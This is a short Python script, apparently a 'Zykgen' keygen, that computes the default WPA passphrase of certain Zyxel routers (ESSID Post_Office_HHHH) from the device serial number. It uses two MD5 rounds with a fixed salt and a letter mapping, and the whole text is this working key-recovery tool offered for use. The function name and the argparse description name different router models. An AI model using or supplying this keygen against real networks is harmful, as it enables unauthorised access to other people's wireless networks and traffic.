# For ESSID Post_Office_HHHH with serial numbers less than S18x
import hashlib
import argparse

def amg1302_t11c(serial):
    # First MD5 round
    md5 = hashlib.md5()
    md5.update(serial.encode())
    hex_digest = md5.hexdigest()

    # Second MD5 round
    salt = "PSK_ra0"
    comb = hex_digest + salt
    md52 = hashlib.md5()
    md52.update(comb.encode())
    digest2 = md52.digest()

    moduli = []
    for i in range(0,8):
        moduli.append(md52.digest()[i] % 26)
    key = ""
    for i in moduli:
        key += chr(i + 97)


    base = digest2[0] * 256 + digest2[1]
    replacement_charset = 'abcdefghijkmnopqrstuvwxyz'

    for i in range(0, 7):
        if key[i] == "l":
            substitute = base % 25
            letter = replacement_charset[substitute]
            key = "%s%s%s" % (key[:i], letter, key[i+1:])
    print(key)

parser = argparse.ArgumentParser(description='Zykgen WPA keygen. (Zyxel VMG8823-B50B)')
parser.add_argument('serial', help='Serial Number')
args = parser.parse_args()

amg1302_t11c(args.serial)
